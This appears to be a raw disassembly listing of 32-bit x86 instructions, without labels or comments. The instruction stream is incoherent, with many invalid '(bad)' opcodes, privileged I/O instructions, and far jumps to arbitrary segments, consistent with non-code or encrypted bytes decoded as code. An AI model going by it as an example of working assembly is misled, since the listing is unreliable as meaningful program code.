  4028dc:	jmp    0xf723:0xabc688ed
  4028e3:	mov    edi,0x1e47fac3
  4028e8:	outs   dx,BYTE PTR ds:[esi]
  4028e9:	stc    
  4028ea:	int3   
  4028eb:	pop    esi
  4028ec:	mov    BYTE PTR [edi],0x70
  4028ef:	rol    BYTE PTR [edi-0x393a49cd],cl
  4028f5:	sbb    DWORD PTR [ecx+0x68650e9e],ecx
  4028fb:	ret    
  4028fc:	repnz aad 0x50
  4028ff:	in     al,dx
  402900:	adc    BYTE PTR [edi-0x5f0b7878],0xdb
  402907:	mov    ds:0x159a35cf,eax
  40290c:	add    BYTE PTR [ecx+0x5a],cl
  40290f:	add    eax,0x9bf2275b
  402914:	push   esp
  402915:	arpl   WORD PTR [edi-0x2d9a2596],si
  40291b:	fisttp QWORD PTR [ecx]
  40291d:	lock fimul WORD PTR [esi+0x3d]
  402921:	rcl    BYTE PTR [edi-0x49],1
  402924:	push   esi
  402925:	lods   eax,DWORD PTR ds:[esi]
  402926:	arpl   WORD PTR [edi+0x6231d41a],cx
  40292c:	xchg   edi,eax
  40292d:	imul   edx,DWORD PTR [edi+0x50],0x113b9997
  402934:	xchg   ebx,eax
  402935:	pop    ecx
  402936:	out    0xb3,al
  402938:	or     al,0xda
  40293a:	mov    al,0x1f
  40293c:	std    
  40293d:	cld    
  40293e:	inc    esi
  40293f:	(bad)  
  402940:	xlat   BYTE PTR ds:[ebx]
  402941:	add    DWORD PTR [edx+ebx*1-0x5],edi
  402945:	sub    DWORD PTR [edx],esi
  402947:	ins    DWORD PTR es:[edi],dx
  402948:	and    DWORD PTR [eax],edi
  40294a:	xor    ebx,esi
  40294c:	sahf   
  40294d:	mov    ds:0x6af4ce3b,eax
  402952:	pushf  
  402953:	test   DWORD PTR [eax],eax
  402955:	sub    DWORD PTR [esi+eiz*4+0x2edd2acf],esi
  40295c:	jl     0x4029c3
  40295e:	push   ss
  40295f:	mov    ds:0xac542b97,al
  402964:	sbb    edi,DWORD PTR [ecx+0x3c616c0b]
  40296a:	ds mov esi,0xa38c2021
  402970:	ins    BYTE PTR es:[edi],dx
  402971:	jb     0x4028fe
  402973:	jp     0x402912
  402975:	sbb    DWORD PTR [edx+0x76f4907f],0xffffffcd
  40297c:	in     eax,dx
  40297d:	push   eax
  40297e:	push   esp
  40297f:	mov    dl,0x9
  402981:	xchg   ebx,ebx
  402983:	jo     0x402957
  402985:	cs push eax
  402987:	call   0x6e0c:0x5c8a1ad5
  40298e:	xchg   BYTE PTR [ecx-0x5b],bh
  402991:	adc    DWORD PTR [edi],edi
  402993:	add    DWORD PTR [eax],eax
  402995:	dec    esp
  402996:	add    eax,DWORD PTR [esi+0x6f]
  402999:	les    edx,FWORD PTR [edx]
  40299b:	sbb    DWORD PTR [di+0x57],esp
  40299f:	xchg   esi,eax
  4029a0:	push   0x14
  4029a2:	rcr    BYTE PTR [ecx-0x2f70dff3],cl
  4029a8:	cmp    DWORD PTR [ebx],esi
  4029aa:	push   ebx
  4029ab:	mov    esp,0x29776fd4
  4029b0:	int3   
  4029b1:	arpl   WORD PTR [eax+eiz*1],cx
  4029b4:	enter  0xe086,0xa0
  4029b8:	dec    ebp
  4029b9:	adc    BYTE PTR [esi+0x75],0x9e
  4029bd:	aas    
  4029be:	(bad)  
  4029bf:	mov    al,0xc8
  4029c1:	ins    BYTE PTR es:[edi],dx
  4029c2:	aad    0x6c
  4029c4:	push   ebp
  4029c5:	jns    0x402a21
  4029c7:	mov    ebp,0x9d2b6d4e
  4029cc:	repnz ins BYTE PTR es:[edi],dx
  4029ce:	and    ebp,edi
  4029d0:	add    DWORD PTR [ecx],0x18
  4029d3:	ficomp DWORD PTR [edx+0x381a10a2]
  4029d9:	push   0xfa193f47
  4029de:	sbb    DWORD PTR [edx+0x216213db],0x565a2e5c
  4029e8:	lahf   
  4029e9:	test   al,0xf8
  4029eb:	dec    ebx
  4029ec:	stos   DWORD PTR es:[edi],eax
  4029ed:	sbb    bh,BYTE PTR [edi+0x1440b5ed]
  4029f3:	retf   0x883c
  4029f6:	cld    
  4029f7:	ins    DWORD PTR es:[edi],dx
  4029f8:	retf   0x96fb
  4029fb:	xor    esp,DWORD PTR [edx-0x5f]
  4029fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029ff:	aas    
  402a00:	icebp  
  402a01:	xor    al,0x3d
  402a03:	sbb    al,0xcf
  402a05:	pop    esi
  402a06:	pop    ds
  402a07:	mov    al,ds:0x37f259ac
  402a0c:	add    bh,BYTE PTR [esi]
  402a0e:	sbb    al,0x45
  402a10:	popa   
  402a11:	loop   0x402a4e
  402a13:	and    BYTE PTR es:[ebx+0x41641e12],dl
  402a1a:	rcr    al,cl
  402a1c:	mov    al,0xea
  402a1e:	inc    ebx
  402a1f:	(bad)  
  402a20:	sar    DWORD PTR [edi-0x21073617],cl
  402a26:	imul   ebx,DWORD PTR [ebx+0xe],0xb6574048
  402a2d:	sbb    eax,0xa7c13421
  402a32:	fnsave [eax-0x5af6ea7]
  402a38:	mov    edi,0x63ad2a11
  402a3d:	inc    eax
  402a3e:	gs iret 
  402a40:	scas   al,BYTE PTR es:[edi]
  402a41:	div    DWORD PTR [edx+ecx*1+0x65]
  402a45:	fidivr WORD PTR [esi]
  402a47:	cmp    ecx,eax
  402a49:	into   
  402a4a:	add    esp,ecx
  402a4c:	add    eax,0x8ba1facb
  402a51:	loope  0x402a6c
  402a53:	aad    0xff
  402a55:	mov    ds:0xd9246112,al
  402a5a:	dec    eax
  402a5b:	(bad)  
  402a5c:	pop    ss
  402a5d:	popa   
  402a5e:	fisttp DWORD PTR [edx+0x7b]
  402a61:	les    ebp,FWORD PTR [esi-0x6]
  402a64:	stos   BYTE PTR es:[edi],al
  402a65:	in     eax,0x59
  402a67:	lods   eax,DWORD PTR ds:[esi]
  402a68:	neg    DWORD PTR [eax]
  402a6a:	jns    0x402ac2
  402a6c:	rep lods eax,DWORD PTR ds:[esi]
  402a6e:	cmc    
  402a6f:	dec    edi
  402a70:	ds in  al,0x27
  402a73:	packssdw mm1,QWORD PTR [edx]
  402a76:	lahf   
  402a77:	aaa    
  402a78:	nop
  402a79:	cmp    dh,BYTE PTR [ebx-0x14]
  402a7c:	or     dl,BYTE PTR [ecx-0x49]
  402a7f:	add    ah,0x65
  402a82:	xor    DWORD PTR [eax+0x77],0x630f9df1
  402a89:	pop    ss
  402a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a8b:	test   BYTE PTR [edx-0x67a97d70],cl
  402a91:	ret    
  402a92:	adc    DWORD PTR [ebp-0x6902b888],edi
  402a98:	loope  0x402a24
  402a9a:	cs sbb BYTE PTR ss:[ecx-0x3255e7cf],ah
  402aa2:	(bad)  
  402aa3:	das    
  402aa4:	lods   al,BYTE PTR ds:[esi]
  402aa5:	push   edi
  402aa6:	or     DWORD PTR ds:0xbce4cc27,esi
  402aac:	push   ds
  402aad:	scas   al,BYTE PTR es:[edi]
  402aae:	and    BYTE PTR [ebx-0x6f43d725],dh
  402ab4:	outs   dx,DWORD PTR ds:[esi]
  402ab5:	sbb    al,0xa5
  402ab7:	imul   esp,DWORD PTR [esi],0x5fedf4ea
  402abd:	(bad)  
  402abf:	push   ebx
  402ac0:	out    dx,al
  402ac1:	adc    DWORD PTR [ebx+0x6ba7f8a0],edi
  402ac7:	inc    ebx
  402ac8:	sbb    DWORD PTR [esi-0x44],0x6d7dda69
  402acf:	and    al,0x46
  402ad1:	inc    edi
  402ad2:	xor    eax,0x52
  402ad5:	cmp    al,0xf7
  402ad7:	xor    ebx,esp
  402ad9:	sbb    ebp,DWORD PTR [ebp-0x47]
  402adc:	push   0x5131feb7
  402ae1:	jmp    0x402ae9
  402ae3:	xor    al,0x77
  402ae5:	sti    
  402ae6:	fs jp  0x402aea
  402ae9:	ja     0x402b42
  402aeb:	jp     0x402af5
  402aed:	adc    eax,0xb1a491bf
  402af2:	jl     0x402a79
  402af4:	dec    ecx
  402af5:	rol    ah,1
  402af7:	pop    esi
  402af8:	and    eax,0xedb3d1e4
  402afd:	rcl    DWORD PTR [ebx],1
  402aff:	imul   esi,DWORD PTR [edi],0xffffff9a
  402b02:	ja     0x402ad7
  402b04:	sbb    ecx,DWORD PTR [edx-0x1b]
  402b07:	addr16 jbe 0x402b5e
  402b0a:	mov    al,0xe4
  402b0c:	or     DWORD PTR [ebx+edx*1-0x44],edx
  402b10:	mul    BYTE PTR [eax]
  402b12:	dec    edi
  402b13:	fs dec ebp
  402b15:	mov    dl,0xbc
  402b17:	sub    ah,BYTE PTR [ebp+0xef3a7e6]
  402b1d:	push   cs
  402b1e:	dec    ebp
  402b1f:	cdq    
  402b20:	sbb    BYTE PTR [edx-0x54],bl
  402b23:	fidivr DWORD PTR [esi]
  402b25:	pop    esi
  402b26:	mov    esi,0xb80ad445
  402b2b:	pop    ebx
  402b2c:	sub    al,0x3a
  402b2e:	inc    edx
  402b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b30:	fistp  DWORD PTR [esi]
  402b32:	lods   al,BYTE PTR ds:[esi]
  402b33:	data16 ror BYTE PTR [ebx],cl
  402b36:	sbb    eax,0x6e6d328b
  402b3b:	lahf   
  402b3c:	cmp    al,0x1f
  402b3e:	arpl   WORD PTR [ebp-0x69],ax
  402b41:	retf   0xf044
  402b44:	stc    
  402b45:	das    
  402b46:	add    ah,BYTE PTR [esi+0xda252d9]
  402b4c:	adc    DWORD PTR [ebx+ebp*2-0x25],ebx
  402b50:	js     0x402bc5
  402b52:	and    bh,BYTE PTR [edx+ebx*4+0x1d997b2d]
  402b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b5a:	test   DWORD PTR [ebx-0x62],edx
  402b5d:	and    al,0xcf
  402b5f:	cmp    eax,0xccbc9032
  402b64:	add    eax,0x4d9cb8c4
  402b69:	rcl    DWORD PTR [esi],cl
  402b6b:	inc    ebx
  402b6c:	xchg   esp,eax
  402b6d:	xor    BYTE PTR ss:[edx],al
  402b70:	js     0x402bee
  402b72:	loopne 0x402b8c
  402b74:	fldcw  WORD PTR [ebx]
  402b76:	in     al,0x87
  402b78:	add    dh,BYTE PTR [ebx]
  402b7a:	int3   
  402b7b:	lods   eax,DWORD PTR ds:[esi]
  402b7c:	jae    0x402bad
  402b7e:	inc    ebx
  402b7f:	xor    DWORD PTR [ebp-0x64],ebx
  402b82:	aam    0x15
  402b84:	sbb    BYTE PTR [edx],al
  402b86:	mov    fs,WORD PTR [ebx+0x34]
  402b89:	jo     0x402b48
  402b8b:	jo     0x402ba2
  402b8d:	sbb    ecx,DWORD PTR ds:0x83a2d821
  402b93:	rol    BYTE PTR [ebp+0x3526f870],0xb5
  402b9a:	add    BYTE PTR [eax-0x56cf0ed7],dl
  402ba0:	xchg   ebp,eax
  402ba1:	aam    0x70
  402ba3:	sub    esp,DWORD PTR [ebx+0x1d]
  402ba6:	sbb    DWORD PTR [ecx],ebp
  402ba8:	test   BYTE PTR [esi-0x49],bh
  402bab:	sahf   
  402bac:	sub    ebp,DWORD PTR [edi+0x55]
  402baf:	loopne 0x402bcd
  402bb1:	pop    ebx
  402bb2:	cmp    eax,0xcd7a0b62
  402bb7:	cli    
  402bb8:	sub    edx,esi
  402bba:	mov    bl,0xc3
  402bbc:	mov    ?,WORD PTR [esi]
  402bbe:	pushf  
  402bbf:	xchg   ebx,eax
  402bc0:	cdq    
  402bc1:	imul   edx,ebp,0xffffffe5
  402bc4:	rcl    BYTE PTR [eax-0x48d4f533],cl
  402bca:	mov    eax,ds:0xe51a35c4
  402bcf:	and    ah,bh
  402bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bd2:	sub    ah,BYTE PTR [ebx-0x121691f8]
  402bd8:	stos   DWORD PTR es:[edi],eax
  402bd9:	mov    bl,0x72
  402bdb:	lds    esp,FWORD PTR [edx-0x47]
  402bde:	mov    esp,DWORD PTR [ebx-0x54538c73]
  402be4:	in     al,dx
  402be5:	test   BYTE PTR ds:0x538a47b4,bl
  402beb:	adc    DWORD PTR [esi],edx
  402bed:	and    ecx,edx
  402bef:	aas    
  402bf0:	xlat   BYTE PTR ds:[ebx]
  402bf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bf3:	int    0x69
  402bf5:	and    WORD PTR [ecx+edx*4-0x4753d74f],si
  402bfd:	test   esi,edx
  402bff:	adc    eax,0x55ed095c
  402c04:	ja     0x402b88
  402c06:	call   DWORD PTR [ecx+eiz*1+0x632b3ab]
  402c0d:	jae    0x402c74
  402c0f:	shr    BYTE PTR [edi-0x48b9c2af],cl
  402c15:	shl    BYTE PTR [eax+0x3c],1
  402c18:	sti    
  402c19:	loope  0x402c7a
  402c1b:	add    cl,0x5a
  402c1e:	dec    edx
  402c1f:	lods   eax,DWORD PTR ds:[esi]
  402c20:	push   edi
  402c21:	(bad)  
  402c22:	test   edi,0x4b35f6e1
  402c28:	sar    dh,1
  402c2a:	sub    eax,0x53972fab
  402c2f:	into   
  402c30:	jno    0x402c33
  402c32:	imul   edx,DWORD PTR ds:[edx+0x4be03728],0x637f3ad7
  402c3d:	jle    0x402bda
  402c3f:	out    0xbf,eax
  402c41:	jmp    0x785a:0xd01acd1d
  402c48:	out    0x22,al
  402c4a:	and    ebp,DWORD PTR es:[eax+edi*2+0x64b8b8e7]
  402c52:	mov    ecx,0xc8ee7d40
  402c57:	sub    esi,edi
  402c59:	imul   esp,DWORD PTR ds:0xcf4c404,0x7e83e8d9
  402c63:	xchg   edi,eax
  402c64:	cmp    bl,BYTE PTR [esp+ecx*4-0x3b81313d]
  402c6b:	xor    esp,DWORD PTR cs:0xa965fc37
  402c72:	adc    edx,DWORD PTR [edx]
  402c74:	cwde   
  402c75:	xchg   ebp,eax
  402c76:	mov    ah,0x31
  402c78:	into   
  402c79:	ins    DWORD PTR es:[edi],dx
  402c7a:	push   0x6113d7ec
  402c7f:	lods   eax,DWORD PTR ds:[esi]
  402c80:	ins    BYTE PTR es:[edi],dx
  402c81:	mov    ah,al
  402c83:	outs   dx,BYTE PTR ds:[esi]
  402c84:	push   edi
  402c85:	out    dx,eax
  402c86:	(bad)  
  402c87:	inc    BYTE PTR [edx]
  402c89:	gs cld 
  402c8b:	sbb    DWORD PTR [esi-0x3379aa01],edx
  402c91:	mov    WORD PTR [eax],es
  402c93:	(bad)  
  402c95:	inc    esi
  402c96:	push   esp
  402c97:	in     al,dx
  402c98:	xchg   ecx,eax
  402c99:	es (bad) 
  402c9b:	sub    ebx,DWORD PTR [ecx]
  402c9d:	nop    DWORD PTR [edx]
  402ca0:	mov    dl,0x4d
  402ca2:	mov    ch,0x5d
  402ca4:	xor    eax,esp
  402ca6:	inc    ebx
  402ca7:	fs xchg ebx,eax
  402ca9:	push   0xdbbb195a
  402cae:	sub    DWORD PTR [ebx],eax
  402cb0:	fiadd  DWORD PTR [eax]
  402cb2:	inc    eax
  402cb3:	imul   esi,DWORD PTR [ebx],0x48
  402cb6:	jmp    0x64265d2c
  402cbb:	pop    es
  402cbc:	imul   edx,DWORD PTR [ebx-0x5fd215cd],0x354a2e05
  402cc6:	ret    0x721d
  402cc9:	loope  0x402c9e
  402ccb:	push   ecx
  402ccc:	add    DWORD PTR [edi],esi
  402cce:	lods   al,BYTE PTR ds:[esi]
  402ccf:	inc    esp
  402cd0:	dec    ecx
  402cd1:	xor    eax,ebx
  402cd3:	jnp    0x402d47
  402cd5:	cmc    
  402cd6:	in     eax,0xaa
  402cd8:	cmp    ebx,DWORD PTR [ebx-0x1f]
  402cdb:	cmp    eax,DWORD PTR [ebp-0x4a91a721]
  402ce1:	pop    esi
  402ce2:	popf   
  402ce3:	adc    dl,bh
  402ce5:	ret    0x3afb
  402ce8:	push   0xffffff97
  402cea:	aas    
  402ceb:	xor    BYTE PTR [ecx-0x48],dh
  402cee:	outs   dx,DWORD PTR ds:[esi]
  402cef:	mov    edi,ds
  402cf1:	adc    al,0x70
  402cf3:	pop    ds
  402cf4:	xchg   edi,eax
  402cf5:	mov    bh,0xf8
  402cf7:	dec    esi
  402cf8:	inc    esi
  402cf9:	pop    ecx
  402cfa:	aam    0xf7
  402cfc:	cmp    al,0x7f
  402cfe:	dec    edx
  402cff:	dec    ecx
  402d00:	sbb    cl,al
  402d02:	test   BYTE PTR [ecx-0x2c],ch
  402d05:	push   ds
  402d06:	xchg   BYTE PTR [ebp+ebp*1+0x61],dh
  402d0a:	mov    ds:0x239a2839,eax
  402d0f:	mov    al,es:0xc8abca99
  402d15:	fcomp  DWORD PTR [eax-0x3db94132]
  402d1b:	in     al,dx
  402d1c:	leave  
  402d1d:	into   
  402d1e:	(bad)  
  402d1f:	or     eax,0x8335d05e
  402d24:	retf   0x7a17
  402d27:	inc    edx
  402d28:	pop    esi
  402d29:	cdq    
  402d2a:	mov    bh,0xdf
  402d2c:	fdiv   QWORD PTR [edx+0x4f485fd0]
  402d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d33:	ficomp DWORD PTR [eax-0x15595e60]
  402d39:	jae    0x402d0e
  402d3b:	push   ecx
  402d3c:	loop   0x402d9e
  402d3e:	cmp    BYTE PTR [edi-0x5f],al
  402d41:	out    0xec,eax
  402d43:	or     DWORD PTR [edx*1-0x4dfe5c86],edx
  402d4a:	aam    0xcb
  402d4c:	test   BYTE PTR [ecx+0x14d5940a],bh
  402d52:	ins    DWORD PTR es:[di],dx
  402d54:	jb     0x402db5
  402d56:	xchg   DWORD PTR [esi-0x6d882f5b],ebx
  402d5c:	shr    DWORD PTR [edx],cl
  402d5e:	test   al,0x8c
  402d60:	cmp    ecx,esp
  402d62:	or     DWORD PTR [edx+0x5c],esp
  402d65:	pop    ds
  402d66:	pop    ebx
  402d67:	inc    ebx
  402d68:	dec    ecx
  402d69:	arpl   di,cx
  402d6b:	aaa    
  402d6c:	(bad)  
  402d6d:	cmp    cl,BYTE PTR [ebx+0x582ec2a9]
  402d73:	push   0xffffffff
  402d75:	gs dec esp
  402d77:	add    DWORD PTR [ebx+0x196dfe93],ecx
  402d7d:	cmp    ebx,DWORD PTR [ebp+ebp*8-0x4d15df80]
  402d84:	aas    
  402d85:	xor    al,0x6e
  402d87:	inc    esi
  402d88:	shl    edx,0x0
  402d8b:	jb     0x402dcc
  402d8d:	xchg   ebp,eax
  402d8e:	mov    al,BYTE PTR [ecx-0x455edfab]
  402d94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d96:	adc    DWORD PTR [eax],esp
  402d98:	loopne 0x402d36
  402d9a:	jae    0x402dde
  402d9c:	ja     0x402db8
  402d9e:	and    eax,0xc1ba4f02
  402da3:	repz cs xchg esp,eax
  402da6:	mov    fs,WORD PTR [edx]
  402da8:	scas   eax,DWORD PTR es:[edi]
  402da9:	loope  0x402e0f
  402dab:	inc    esp
  402dac:	cmc    
  402dad:	push   esi
  402dae:	in     al,dx
  402daf:	addr16 cdq 
  402db1:	out    0x3a,eax
  402db3:	mov    bh,0x45
  402db5:	in     al,0xce
  402db7:	push   ebx
  402db8:	out    0xf6,eax
  402dba:	dec    edx
  402dbb:	add    eax,0x1516e8f9
  402dc0:	jo     0x402df3
  402dc2:	cmp    dl,ah
  402dc4:	inc    ebp
  402dc5:	mov    esp,0xf07766eb
  402dca:	xor    ebx,DWORD PTR [esp+edi*4-0x5309b9c6]
  402dd1:	sbb    DWORD PTR [ecx],ecx
  402dd3:	mov    ebx,0x3f8987b8
  402dd8:	sti    
  402dd9:	in     eax,dx
  402dda:	adc    esi,0xffffffe9
  402ddd:	inc    ebp
  402dde:	mov    fs,WORD PTR [esi+esi*8]
  402de1:	imul   cl
  402de3:	xor    bl,BYTE PTR [eax+ebx*2+0x12e1af35]
  402dea:	arpl   WORD PTR [ecx-0xdff20ee],bp
  402df0:	pop    ebx
  402df1:	fs jecxz 0x402dd8
  402df4:	mov    edx,0x86a7bacf
  402df9:	inc    ecx
  402dfa:	cmp    ax,WORD PTR [esi+ebp*1+0x78]
  402dff:	mov    al,0xec
  402e01:	gs inc edi
  402e03:	xor    al,0x63
  402e05:	scas   eax,DWORD PTR es:[edi]
  402e06:	pop    edx
  402e07:	xlat   BYTE PTR ds:[ebx]
  402e08:	stos   DWORD PTR es:[edi],eax
  402e09:	dec    edi
  402e0a:	es (bad) 
  402e0c:	mov    ?,WORD PTR [ebp-0x22]
  402e0f:	mov    ?,WORD PTR [ebp-0x42f02a5e]
  402e15:	ds jg  0x402e30
  402e18:	mov    ds,WORD PTR [edx-0x66]
  402e1b:	sub    BYTE PTR [ebx-0x60],ah
  402e1e:	fdivr  DWORD PTR [esi]
  402e20:	fbld   TBYTE PTR [esi-0x4f1d08ca]
  402e26:	or     al,0x66
  402e28:	xchg   DWORD PTR [esi-0x2e3481c3],edi
  402e2e:	mov    eax,esi
  402e30:	dec    edx
  402e31:	and    esp,DWORD PTR [ebp-0x2721c560]
  402e37:	loopne 0x402e2e
  402e39:	nop
  402e3a:	cmp    eax,0x3d9fbb60
  402e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e40:	or     dh,BYTE PTR [ebx+0x77]
  402e43:	adc    BYTE PTR [ebx+0x3db509ce],dl
  402e49:	retf   0x78f4
  402e4c:	daa    
  402e4d:	sbb    eax,0xd737e79e
  402e52:	jle    0x402ea5
  402e54:	clc    
  402e55:	pop    edi
  402e56:	ret    0x26c3
  402e59:	and    DWORD PTR [ebx+0x38],eax
  402e5c:	mov    ds:0x94d8e16d,al
  402e61:	jae    0x402e98
  402e63:	dec    eax
  402e64:	push   ds
  402e65:	and    edx,DWORD PTR [esi+0x47]
  402e68:	ror    ebp,cl
  402e6a:	in     al,0x79
  402e6c:	pop    ebx
  402e6d:	outs   dx,DWORD PTR ds:[esi]
  402e6e:	enter  0x99aa,0xd1
  402e72:	jns    0x402eb3
  402e74:	mov    edi,0x606b1cb9
  402e79:	or     esp,DWORD PTR [eax-0x68]
  402e7c:	retf   0x1088
  402e7f:	xlat   BYTE PTR ds:[ebx]
  402e80:	lahf   
  402e81:	ret    0xa0ca
  402e84:	out    0x85,eax
  402e86:	push   cs
  402e87:	jnp    0x402e4f
  402e89:	mov    ds:0xdeca7254,eax
  402e8e:	int3   
  402e8f:	lods   al,BYTE PTR ds:[esi]
  402e90:	(bad)  
  402e92:	adc    ah,dl
  402e94:	out    dx,al
  402e95:	push   edx
  402e96:	iret   
  402e97:	fild   DWORD PTR [esi+0x64]
  402e9a:	sub    dl,bh
  402e9c:	jl     0x402ee8
  402e9e:	ret    0xcb36
  402ea1:	pop    ss
  402ea2:	data16 shl BYTE PTR [eax],1
  402ea5:	out    dx,al
  402ea6:	popf   
  402ea7:	rol    DWORD PTR [ecx+ebx*2],cl
  402eaa:	div    DWORD PTR [ebp+0x255added]
  402eb0:	xlat   BYTE PTR ds:[ebx]
  402eb1:	dec    ecx
  402eb2:	imul   esi,DWORD PTR [ebx+0x26],0xffffffc5
  402eb6:	xor    BYTE PTR [eax],cl
  402eb8:	adc    BYTE PTR [edi+0xa8c97ce],0xe7
  402ebf:	ja     0x402ef8
  402ec1:	gs push esp
  402ec3:	dec    esi
  402ec4:	jge    0x402e79
  402ec6:	call   DWORD PTR [edi-0x44]
  402ec9:	call   0x28a458d2
  402ece:	sub    ecx,0x92a8aae3
  402ed4:	mov    ebp,ds
  402ed6:	inc    BYTE PTR [esi-0x24f67f6e]
  402edc:	sahf   
  402edd:	jle    0x402eac
  402edf:	aad    0x2
  402ee1:	scas   al,BYTE PTR es:[edi]
  402ee2:	sub    DWORD PTR [ebp+0x41b5786d],ebx
  402ee8:	and    al,0xdf
  402eea:	add    ecx,esi
  402eec:	popf   
  402eed:	stc    
  402eee:	cld    
  402eef:	jns    0x402eda
  402ef1:	outs   dx,BYTE PTR ds:[esi]
  402ef2:	stc    
  402ef3:	inc    eax
  402ef4:	pop    DWORD PTR [esi]
  402ef6:	inc    ebp
  402ef7:	jb     0x402edd
  402ef9:	int3   
  402efa:	mov    dl,0x5
  402efc:	jle    0x402eb2
  402efe:	push   ds
  402eff:	push   ebx
  402f00:	xor    eax,0x92137e04
  402f05:	sub    BYTE PTR [ecx],bh
  402f07:	or     eax,0x78e96a1b
  402f0c:	mov    cl,ah
  402f0e:	cdq    
  402f0f:	cwde   
  402f10:	mov    esi,0xb78f5367
  402f15:	ds inc edx
  402f17:	bnd jae 0x402f36
  402f1a:	mov    cl,0x18
  402f1c:	fld    TBYTE PTR [eax-0x6e]
  402f1f:	enter  0x68ac,0x75
  402f23:	xchg   DWORD PTR [edi+0x559f9103],ebp
  402f29:	in     al,dx
  402f2a:	jle    0x402ebe
  402f2c:	scas   eax,DWORD PTR es:[edi]
  402f2d:	mov    BYTE PTR [esi],al
  402f2f:	dec    edi
  402f30:	sub    dh,BYTE PTR [ebx+edi*8+0x38]
  402f34:	add    al,0x4f
  402f36:	call   0xa7a34a3a
  402f3b:	pop    edi
  402f3c:	dec    eax
  402f3d:	jnp    0x402f89
  402f3f:	inc    ecx
  402f40:	cwde   
  402f41:	imul   eax,DWORD PTR [ebx+0x5c],0xffffffff
  402f45:	push   0xffffffe5
  402f47:	mov    bl,0x30
  402f49:	add    ch,BYTE PTR [eax-0x49]
  402f4c:	sbb    al,0xe3
  402f4e:	mov    al,ds:0x58553b9a
  402f53:	data16 lahf 
  402f55:	or     DWORD PTR [edx+0x43],ecx
  402f58:	mov    bh,0x13
  402f5a:	or     ecx,esi
  402f5c:	add    cl,bh
  402f5e:	test   BYTE PTR fs:[eax],0xc0
  402f62:	and    ah,BYTE PTR [ecx-0x68c8bf00]
  402f68:	mov    edi,0x54384488
  402f6d:	stc    
  402f6e:	jg     0x402f4a
  402f70:	aas    
  402f71:	lods   al,BYTE PTR ds:[esi]
  402f72:	data16 sbb al,0x86
  402f75:	xchg   DWORD PTR [ebx+0x13f29856],esp
  402f7b:	lods   eax,DWORD PTR ds:[esi]
  402f7c:	ss jne 0x402fdf
  402f7f:	into   
  402f80:	ret    
  402f81:	ret    0x845d
  402f84:	clc    
  402f85:	push   esp
  402f86:	hlt    
  402f87:	xchg   edx,eax
  402f88:	sub    BYTE PTR [esi-0x13],bh
  402f8b:	xchg   esi,eax
  402f8c:	pop    ss
  402f8d:	cld    
  402f8e:	mov    ds:0xcf86460f,eax
  402f93:	std    
  402f94:	xor    edi,DWORD PTR [eax+0x1e]
  402f97:	mov    edx,0x2fd1c824
  402f9c:	inc    ebx
  402f9d:	mov    eax,0x9a1a078e
  402fa2:	ins    BYTE PTR es:[edi],dx
  402fa3:	push   edx
  402fa4:	adc    BYTE PTR ds:[edi+0xe2f86c1],ch
  402fab:	les    esp,FWORD PTR [edi+esi*2+0x6ddf5e63]
  402fb2:	push   ds
  402fb3:	imul   edx,DWORD PTR [ecx],0x5dd9a56f
  402fb9:	adc    eax,0x86602535
  402fbe:	jmp    0x402f85
  402fc0:	(bad)  
  402fc1:	cli    
  402fc2:	push   edx
  402fc3:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fc5:	bound  ebx,QWORD PTR [ecx]
  402fc7:	xor    BYTE PTR [ebx-0x5e7b232],cl
  402fcd:	ficom  DWORD PTR [edx+0x37]
  402fd0:	jbe    0x402f84
  402fd2:	outs   dx,BYTE PTR ds:[esi]
  402fd3:	shl    DWORD PTR [esi+0x67],cl
  402fd6:	xchg   edi,eax
  402fd7:	and    DWORD PTR [eax+eiz*8+0xf],esp
  402fdb:	inc    ecx
  402fdc:	(bad)  
  402fdd:	cmp    al,0x9c
  402fdf:	ds inc edx
  402fe1:	repz dec esp
  402fe3:	dec    esi
  402fe4:	sbb    eax,ebx
  402fe6:	cmp    BYTE PTR [ebp-0x9],0xa0
  402fea:	bnd ret 
  402fec:	lds    ebx,FWORD PTR [ebp-0x16]
  402fef:	adc    eax,0xcfff0fe4
  402ff4:	scas   al,BYTE PTR es:[edi]
  402ff5:	xor    DWORD PTR [ebx],edx
  402ff7:	lds    esp,FWORD PTR [eax+0x34035f33]
  402ffd:	lds    ebx,FWORD PTR [edx-0x1b]
  403000:	dec    ecx
  403001:	mov    ah,0xdd
  403003:	mov    bl,0x67
  403005:	cs ret 
  403007:	jp     0x403012
  403009:	daa    
  40300a:	push   cs
  40300b:	popf   
  40300c:	or     esi,esi
  40300e:	shl    DWORD PTR [ecx],cl
  403010:	aas    
  403011:	jnp    0x403025
  403013:	mov    eax,0x83143e36
  403018:	mov    esi,0x79c7dada
  40301d:	fnsave [ebx]
  40301f:	mov    WORD PTR [ebx+0x0],ss
  403022:	cmc    
  403023:	cs pop ecx
  403025:	lods   al,BYTE PTR ds:[esi]
  403026:	(bad)  
  403027:	mov    edi,0x5654a642
  40302c:	pop    esi
  40302d:	adc    al,0xd3
  40302f:	sub    eax,0xb05d1d16
  403034:	add    al,0xae
  403036:	imul   ebp,DWORD PTR [ebx+ebx*1-0x74055d17],0x10
  40303e:	cmp    ecx,eax
  403040:	jmp    0x5831baa6
  403045:	cs in  al,0x24
  403048:	sahf   
  403049:	es cwde 
  40304b:	inc    eax
  40304c:	pop    ebx
  40304d:	leave  
  40304e:	ficomp WORD PTR [eax-0x3c]
  403051:	xor    DWORD PTR [esi],edx
  403053:	fs (bad) 
  403055:	hlt    
  403056:	ins    DWORD PTR es:[edi],dx
  403057:	jns    0x4030b8
  403059:	ret    0x14b5
  40305c:	sbb    eax,0x3ab10958
  403061:	sbb    al,0x7c
  403063:	jne    0x4030e2
  403065:	jns    0x40307b
  403067:	or     ecx,DWORD PTR [esi]
  403069:	cwde   
